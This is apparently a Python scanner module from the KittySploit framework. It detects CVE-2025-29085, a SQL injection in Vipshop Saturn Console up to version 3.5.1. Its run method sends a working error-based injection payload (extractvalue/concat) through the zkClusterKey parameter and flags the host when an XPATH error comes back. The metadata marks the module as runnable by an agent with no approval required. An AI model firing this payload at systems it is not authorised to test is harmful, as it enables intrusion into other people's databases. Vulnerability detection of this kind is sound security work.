#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQL injection vulnerability in vipshop Saturn v."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Vipshop Saturn Console <= 3.5.1 - SQL Injection via ClusterKey Component Detection',
        'description': 'SQL injection vulnerability in vipshop Saturn v.3.5.1 and before allows a remote attacker to execute arbitrary code via /console/dashboard/executorCount?zkClusterKey component.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'vipshop', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/advisories/GHSA-49v8-p6mm-3pfj',
            'https://gist.github.com/Cafe-Tea/bcef0d7a2bdb5ec8e0d69de852fdc900',
        ],
        'cve': 'CVE-2025-29085',
    }

    def run(self):
        path = '/console/dashboard/executorCount?zkClusterKey=1%27-extractvalue(1,concat(0x0a,version()))--%20-'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ("java.sql.SQLException: XPATH syntax error: '",)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='Vipshop Saturn Console <= 3.5.1 - SQL Injection via ClusterKey Component detected', path=path)
            return True
        return False

